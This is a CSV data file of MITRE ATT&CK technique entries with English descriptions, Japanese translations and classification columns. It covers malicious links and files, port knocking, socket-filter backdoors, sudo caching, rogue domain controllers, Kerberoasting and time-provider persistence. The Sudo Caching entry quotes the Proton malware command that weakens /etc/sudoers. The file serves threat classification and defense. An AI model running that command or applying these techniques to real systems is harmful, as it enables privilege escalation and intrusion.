T1204.001,T1204,Malicious Link,悪意のあるリンク,An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).,攻撃者は、ユーザーが悪意のあるリンクをクリックすることを頼りに実行権限を獲得しようとする可能性があります。ユーザーはソーシャルエンジニアリングの手法により、コード実行につながるリンクをクリックさせられる場合があります。このユーザー操作は通常、[スピアフィッシングリンク](https://attack.mitre.org/techniques/T1566/002)からの追従行動として観察されます。 リンクのクリックは、[クライアント実行のためのエクスプロイト](https://attack.mitre.org/techniques/T1203)によるブラウザやアプリケーションの脆弱性悪用など、他の実行手法につながる可能性もあります。リンクはまた、[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)による実行を必要とするファイルのダウンロードへとユーザーを誘導することもあります。,execution,Linux;macOS;Windows,other,foothold,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9,2020-03-11T14:43:31.706Z,2025-04-15T19:59:20.108Z,,,,
T1204.002,T1204,Malicious File,悪意のあるファイル,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg. Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",攻撃者は、ユーザーが悪意のあるファイルを開くことを利用して実行権限を獲得しようとする可能性があります。ユーザーは、コード実行につながるファイルを開かせるためのソーシャルエンジニアリングの標的となる場合があります。このユーザー操作は、通常、[標的型フィッシングメールの添付ファイル](https://attack.mitre.org/techniques/T1566/001)に続く行動として観察されます。 攻撃者は、ユーザーによる実行を必要とする複数のファイル形式（.doc、.pdf、.xls、.rtf、.scr、.exe、.lnk、.pif、.cpl、.regなど）を利用することがあります。 攻撃者は、ユーザーが悪意のあるファイルを開いて正常に実行する可能性を高めるために、様々な形態の[なりすまし](https://attack.mitre.org/techniques/T1036)や[難読化されたファイルや情報](https://attack.mitre.org/techniques/T1027)を利用することがあります。 これらの手法には、見慣れた命名規則の使用や、ファイルをパスワードで保護し、ユーザーに開く方法を指示することが含まれる場合があります。（引用：パスワードで保護された Word 文書）[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002) は、初期アクセス直後に頻繁に発生しますが、侵入の他の段階、たとえば、攻撃者が共有ディレクトリやユーザーのデスクトップにファイルを配置し、ユーザーがそれをクリックすることを期待する場合にも発生する可能性があります。 この活動は、[内部標的型フィッシング](https://attack.mitre.org/techniques/T1534)直後にも確認されることがある。,execution,Linux;macOS;Windows,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e,2020-03-11T14:49:36.954Z,2025-04-15T19:58:13.883Z,,,,
T1204.003,T1204,Malicious Image,悪意のある画像,"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs) Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)",攻撃者は、実行を容易にするためにユーザーが悪意のあるイメージを実行することに依存する場合があります。Amazon Web Services (AWS) の Amazon Machine Images (AMI)、Google Cloud Platform (GCP) のイメージ、Azure のイメージ、および Docker などの一般的なコンテナランタイムは、バックドアが仕込まれる可能性があります。 バックドアが仕込まれたイメージは、[マルウェアのアップロード](https://attack.mitre.org/techniques/T1608/001) によって公開リポジトリにアップロードされる可能性があり、ユーザーはイメージが悪意のあるものであることに気付かずに、そのイメージからインスタンスやコンテナをダウンロードしてデプロイする可能性があります。これにより、初期アクセスを特に達成する手法を迂回することができます。 これにより、インスタンスやコンテナ内で、暗号通貨マイニングを実行するコードなどの悪意のあるコードが実行される可能性があります。（引用元：Summit Route Malicious AMIs）また、攻撃者は、ユーザーが誤ってそのイメージからインスタンスやコンテナをデプロイする可能性を高めるために、特定の方法でイメージに名前を付ける場合もあります（例：[Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)）。（引用元：Aqua Security Cloud Native Threat Report June 2021）,execution,IaaS;Containers,data_exfiltration,foothold,user_interaction;endpoint_execution;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec,2021-03-30T17:20:05.789Z,2025-04-25T14:47:40.745Z,,,,
T1204.004,T1204,Malicious Copy and Paste,悪意のあるコピー＆ペースト,"An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Malicious websites, such as those used in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine.(Citation: CloudSEK Lumma Stealer 2024)(Citation: Sekoia ClickFake 2025)(Citation: Reliaquest CAPTCHA 2024)(Citation: AhnLab LummaC2 2025) Adversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution.(Citation: Proofpoint ClickFix 2024)(Citation: AhnLab Malicioys Copy Paste 2024) Tricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files.",攻撃者は、ユーザーがコードをコピー＆ペーストすることを利用して実行権限を獲得する可能性があります。ユーザーはソーシャルエンジニアリングにより、コードを[コマンドおよびスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059)に直接貼り付けるよう誘導される場合があります。 [ドライブバイ攻撃](https://attack.mitre.org/techniques/T1189)などで使用される悪意のあるウェブサイトは、偽のエラーメッセージやCAPTCHAプロンプトを表示し、ユーザーにターミナルやWindowsの実行ダイアログボックスを開いて任意のコマンドを実行するよう指示することがあります。これらのコマンドは、悪意を隠すためにエンコードやその他の手法で難読化されている場合があります。 実行されると、攻撃者は通常、被害者のマシンに足場を築くことが可能になります。(引用: CloudSEK Lumma Stealer 2024)(引用: Sekoia ClickFake 2025)(引用: Reliaquest CAPTCHA 2024)(引用: AhnLab LummaC2 2025) 攻撃者はこの目的でフィッシングメールを利用することもある。 ユーザーが添付ファイルを開こうとすると、偽のエラーが表示され、解決策として悪意のあるコマンドを貼り付けるよう促される場合があります。(引用: Proofpoint ClickFix 2024)(引用: AhnLab Malicioys Copy Paste 2024) ユーザーを騙して自らコマンドを実行させることで、悪意のあるダウンロードファイルからユーザーを保護するために設計されたメールフィルタリング、ブラウザのサンドボックス化、その他の対策回避が可能になります。,execution,Linux;Windows;macOS,script_command_execution,foothold,user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--e261a979-f354-41a8-963e-6cadac27c4bf,2025-03-18T12:57:50.188Z,2025-04-30T17:53:48.667Z,,,,
T1205,,Traffic Signaling,トラフィックシグナリング,"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software. Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s). The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs. On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet. Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities. Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks) To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture. Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",攻撃者は、持続性確保やコマンド＆コントロール（C&C）に使用される開いたポートやその他の悪意のある機能を隠すために、トラフィックシグナリングを利用することがあります。トラフィックシグナリングとは、閉じたポートを開く、悪意のあるタスクを実行するなど、特別な応答を引き起こすためにシステムに送信しなければならないマジック値やシーケンスの使用を伴います。これは、攻撃者がC&Cに使用できるポートが開かれる前に、特定の特性を持つ一連のパケットを送信する形をとる場合があります。 通常、この一連のパケットは、事前に定義された閉じたポートへの接続試行（例：[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)）で構成されますが、異常なフラグ、特定の文字列、その他の固有の特徴を含む場合もあります。シーケンスが完了すると、ポートの開放はホストベースのファイアウォールによって行われることもありますが、カスタムソフトウェアによって実装されることもあります。 攻撃者は既に開いているポートと通信することも可能だが、そのポートで待機するサービスは、適切なマジック値が渡された場合にのみコマンドに応答したり、他の悪意のある機能をトリガーしたりする。通信をトリガーするシグナルパケットの観測は、様々な方法で行うことができる。 Cd00r（引用: Hartrell cd00r 2002）が最初に実装した手法の一つは、libpcapライブラリを使用して対象パケットをスニッフィングする方法である。別の手法では生ソケットを活用し、マルウェアが他のプログラムによって既に使用されているポートを利用できるようにする。 ネットワークデバイスでは、攻撃者は細工したパケットを用いて、telnetなどのデバイス標準サービスに対する[ネットワークデバイス認証](https://attack.mitre.org/techniques/T1556/004)を有効化することがある。このシグナリングは、telnetのような閉じたサービスポートを開くため、あるいはデバイス上のマルウェアインプラントのモジュール変更（悪意のある機能の追加・削除・変更）をトリガーするためにも使用される。 攻撃者は、目的達成のために、1つ以上の（開いているか閉じているかを問わず）ポートへの接続を試みるだけでなく、ルーターインターフェース、ブロードキャスト、同一ポート上のネットワークアドレスIPへの接続も試みる可能性があります。(引用: Cisco Synful Knock Evolution)(引用: Mandiant - Synful Knock)(引用: Cisco Blog Legacy Device Attacks) 組み込みデバイスでこのトラフィックシグナリングを有効化するには、アーキテクチャのモノリシックな性質上、攻撃者はまず[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を達成し活用する必要がある。 攻撃者はまた、電源オフ状態のシステムを起動するためにWake-on-LAN機能を利用する場合がある。Wake-on-LANは、マジックパケットを送信することで電源オフ状態のシステムを起動（ウェイクアップ）させるハードウェア機能である。システムが起動されると、横方向移動の標的となる可能性がある。(引用: Bleeping Computer - Ryuk WoL)(引用: AMD Magic Packet),defense-evasion;persistence;command-and-control,Linux;macOS;Windows;Network Devices,script_command_execution,remote_control,authentication_system;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S4,S2,C02;C04,Secondary Action;Final Impact,C02,Secondary Action,TA0005;TA0003;TA0011,attack-pattern--451a9977-d255-43c9-b431-66de80130c8c,2018-04-18T17:59:24.739Z,2025-04-15T19:58:27.071Z,,,,
T1205.001,T1205,Port Knocking,ポートノッキング,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system. The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",攻撃者は、永続化やコマンド＆コントロールに使用する開いたポートを隠すためにポートノッキングを利用することがあります。ポートを有効化するには、攻撃者は事前に定義された閉じたポートのシーケンスに対して一連の接続試行を送信します。シーケンスが完了すると、ポートの開放はホストベースのファイアウォールによって行われることが多いですが、カスタムソフトウェアによって実装される場合もあります。この手法は、リスニングポートの動的開放だけでなく、別のシステム上のリスニングサーバーへの接続開始にも利用されることが確認されています。 通信をトリガーする信号パケットの監視は、異なる手法で実施可能です。Cd00r（引用: Hartrell cd00r 2002）が最初に実装した手法の一つは、libpcapライブラリを用いて対象パケットをスニッフィングする方法です。別の手法では生ソケットを活用し、マルウェアが他のプログラムで使用中の既存ポートを利用できるようにします。,defense-evasion;persistence;command-and-control,Linux;macOS;Windows;Network Devices,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S4,S2,C02;C04,Secondary Action;Final Impact,C02,Secondary Action,TA0005;TA0003;TA0011,attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd,2020-07-01T18:23:25.002Z,2025-04-25T14:47:21.421Z,,,,
T1205.002,T1205,Socket Filters,ソケットフィルタ,"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell. To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020) Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`. Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",攻撃者は、永続化やコマンド＆コントロールに使用されるバックドアを監視・起動するために、ネットワークソケットにフィルタを添付することがあります。昇格された権限を持つ攻撃者は、`libpcap`ライブラリなどの機能を使用してソケットを開き、特定の種類のデータがソケットを通過することを許可または拒否するフィルタをインストールできます。このフィルタは、指定されたネットワークインターフェース（または指定がない場合はすべてのインターフェース）を通過するすべてのトラフィックに適用される可能性があります。 ネットワークインターフェースがフィルタ条件に一致するパケットを受信すると、ホスト上でリバースシェルの起動など追加アクションがトリガーされる。接続確立のため、攻撃者は標的ホストにインストール済みフィルタ条件に一致する細工済みパケットを送信する。(引用: haking9 libpcap network sniffing) 攻撃者はこれらのソケットフィルタを、インプラントのインストールトリガー、pingバックの実行、コマンドシェルの起動に利用してきた。 これらのソケットフィルタとの通信は、[プロトコルトンネリング](https://attack.mitre.org/techniques/T1572)と組み合わせて使用される場合もある。(引用: exatrack bpf filters passive backdoors)(引用: Leonardo Turla Penquin May 2020) フィルタは、`libpcap`がインストールされたUnix系プラットフォーム、または`Winpcap`を使用するWindowsホストにインストール可能です。 攻撃者は、`pcap_setfilter` を使用した `libpcap` または `SO_ATTACH_FILTER` オプション付きの標準ライブラリ関数 `setsockopt` のいずれかを使用する可能性があります。パケットが受信されるまでソケット接続はアクティブにならないため、ホスト上のアクティビティの欠如、低い CPU オーバーヘッド、生ソケット使用状況への可視性の制限により、この動作を検出するのは困難な場合があります。,defense-evasion;persistence;command-and-control,Linux;macOS;Windows,script_command_execution,remote_control,privileged_account;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S4,S2,C02;C04,Secondary Action;Final Impact,C02,Secondary Action,TA0005;TA0003;TA0011,attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520,2022-09-30T21:18:41.930Z,2025-04-15T23:09:39.651Z,,,,
T1206,,Sudo Caching,sudo キャッシュ,"The <code>sudo</code> command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."" (Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code> that is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again). Adversaries can abuse poor configurations of this to escalate privileges without needing the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. When <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user. The OSX Proton Malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code> (Citation: cybereason osx proton). In order for this change to be reflected, the Proton malware also must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",<code>sudo</code>コマンドは「システム管理者が権限を委譲し、特定のユーザー（またはユーザーグループ）にrootまたは他のユーザーとして一部（または全ての）コマンドを実行する権限を与えつつ、コマンドとその引数の監査証跡を提供する」ことを可能にします。 (引用元: sudo マニュアルページ 2018)sudo はシステム管理者のために設計されているため、<code>sudo</code> の実行間隔（パスワード再入力を要求するまでの時間）を分単位で指定する <code>timestamp_timeout</code> などの有用な設定機能を備えています。これは、<code>sudo</code> が一定期間認証情報をキャッシュする機能を持つためです。 sudo は、このタイムアウトを決定するために、<code>/var/db/sudo</code> に sudo が最後に実行された時刻のタイムスタンプを持つファイルを作成（または更新）します。 さらに、<code>tty_tickets</code> 変数があり、各新規tty（ターミナルセッション）を独立して扱います。これは例えば、あるttyのsudoタイムアウトが別のttyに影響しないことを意味します（パスワードの再入力が必要になります）。攻撃者はこの設定の不備を悪用し、ユーザーのパスワードなしで権限昇格を行う可能性があります。 <code>/var/db/sudo</code>のタイムスタンプを監視し、<code>timestamp_timeout</code>の範囲内かどうかを確認できます。範囲内であれば、マルウェアはユーザーのパスワードを要求されずにsudoコマンドを実行可能です。<code>tty_tickets</code>が無効化されている場合、攻撃者はそのユーザーの任意のttyからこれを実行できます。 OSX Protonマルウェアは、<code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>を発行することでスクリプト作成を容易にするため、<code>tty_tickets</code>を無効化している可能性があります（出典: cybereason osx proton）。 この変更を反映させるため、Protonマルウェアは<code>killall Terminal</code>も実行する必要があります。macOS Sierra以降、sudoersファイルでは<code>tty_tickets</code>がデフォルトで有効化されています。,privilege-escalation,Linux;macOS,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0004,attack-pattern--2169ba87-1146-4fc7-a118-12b72251db7e,2018-04-18T17:59:24.739Z,2025-04-25T15:15:15.978Z,,,,
T1207,,Rogue Domain Controller,不正なドメインコントローラー,"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys. Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide) This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",攻撃者は不正なドメインコントローラーを登録し、Active Directoryデータの操作を可能にする場合があります。DCShadowは不正なドメインコントローラー（DC）を作成するために使用される可能性があります。DCShadowは、DCの動作をシミュレートし（または非アクティブな登録を再利用して）、オブジェクトやスキーマを含むActive Directory（AD）データを操作する方法です。 (出典: DCShadow Blog) 登録後、不正DCは資格情報やキーを含むあらゆるドメインオブジェクトについて、ADインフラへの変更の注入とレプリケーションが可能となる。不正DCの登録には、ADスキーマの構成パーティションに新しいサーバーオブジェクトとnTDSDSAオブジェクトを作成する必要があり、これには管理者権限（ドメイン管理者またはDCローカル管理者）またはKRBTGTハッシュが必要となる。 (引用元: Adsecurity Mimikatz Guide) この手法は、不正DC上での操作がこれらのセンサーに報告されない可能性があるため、システムログやセキュリティ情報イベント管理（SIEM）製品などのセキュリティ監視を迂回する可能性があります。(引用元: DCShadow Blog) また、フォレンジック分析を妨害するために、レプリケーションや関連メタデータの改変・削除にも利用される可能性があります。 攻撃者はこの手法を、[SID履歴注入](https://attack.mitre.org/techniques/T1134/005)の実施やADオブジェクト（アカウント、アクセス制御リスト、スキーマなど）の操作に利用し、永続化のためのバックドアを確立する可能性もある。（引用元：DCShadow Blog）,defense-evasion,Windows,credential_abuse,stealth,authentication_system;privileged_account;logging_monitoring,specified,AD / Directory Server;Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a,2018-04-18T17:59:24.739Z,2025-04-25T15:15:34.258Z,,,,
T1208,,Kerberoasting,Kerberoasting,"Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016) Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016) This same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015) Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014)",サービスプリンシパル名（SPN）は、Windowsサービスの各インスタンスを一意に識別するために使用されます。認証を有効にするには、KerberosはSPNが少なくとも1つのサービスログオンアカウント（サービスを実行する特定の役割を担うアカウント）に関連付けられていることを要求します（引用元：Microsoft Detecting Kerberoasting 2018年2月）。（引用元：Microsoft SPN）（引用元： Microsoft SetSPN） （引用元：SANS Attacking Kerberos Nov 2014） （引用元：Harmj0y Kerberoast Nov 2016） 有効なKerberosチケット付与チケット（TGT）を保持する攻撃者は、ドメインコントローラー（DC）から任意のSPNに対して1つ以上のKerberosチケット付与サービス（TGS）サービスチケットを要求できます。 (引用元: Empire InvokeKerberoast 2016年10月) (引用元: AdSecurity Cracking Kerberos 2015年12月) これらのチケットの一部はRC4アルゴリズムで暗号化される場合があり、これはSPNに関連付けられたサービスアカウントのKerberos 5 TGS-REP etype 23ハッシュが秘密鍵として使用されることを意味し、したがってオフライン[ブルートフォース](https://attack.mitre.org/techniques/T1110)攻撃に対して脆弱であり、平文の認証情報が漏洩する可能性がある。 (引用元: AdSecurity Cracking Kerberos Dec 2015) (引用元: Empire InvokeKerberoast Oct 2016) (引用元: Harmj0y Kerberoast Nov 2016) ネットワークトラフィックから取得したサービスチケットを使用して、同様の攻撃を実行することも可能です。 (引用元: AdSecurity Cracking Kerberos Dec 2015) 解読されたハッシュは、[有効なアカウント](https://attack.mitre.org/techniques/T1078) へのアクセスを通じて、持続性、特権昇格、横方向の移動を可能にする可能性があります。(引用元: SANS Attacking Kerberos Nov 2014),credential-access,Windows,credential_abuse,credential_gain,authentication_system;endpoint_execution;network_connectivity;logging_monitoring,specified,AD / Directory Server;Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--b39d03cb-7b98-41c4-a878-c40c1a913dc0,2018-04-18T17:59:24.739Z,2025-04-25T15:16:00.833Z,,,,
T1209,,Time Providers,タイムプロバイダー,"The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider) Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code>. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider) Adversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)",Windows タイムサービス (W32Time) は、ドメイン間およびドメイン内の時刻同期を可能にします。(引用元: Microsoft W32Time 2018年2月) W32Time タイムプロバイダは、ハードウェア/ネットワークリソースからタイムスタンプを取得し、これらの値を他のネットワーククライアントに出力する役割を担います。 (引用元: Microsoft TimeProvider) タイムプロバイダは、ダイナミックリンクライブラリ (DLL) として実装され、<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code> のサブキーに登録されます。 (引用元: Microsoft TimeProvider) サービス制御マネージャーの指示を受けたタイムプロバイダーマネージャーは、システム起動時および/またはパラメータ変更時に、このキーの下でリストされ有効化されたタイムプロバイダーをロードして起動します。 (引用元: Microsoft TimeProvider) 攻撃者はこのアーキテクチャを悪用し、特に悪意のあるDLLをタイムプロバイダーとして登録・有効化することで永続化を実現する可能性があります。タイムプロバイダーの登録には管理者権限が必要ですが、実行はローカルサービスアカウントのコンテキストで行われます。(引用元: Github W32Time Oct 2017),persistence,Windows,discovery_enumeration,foothold,privileged_account;user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--dce31a00-1e90-4655-b0f9-e2e71a748a87,2018-04-18T17:59:24.739Z,2025-04-25T15:16:15.834Z,,,,
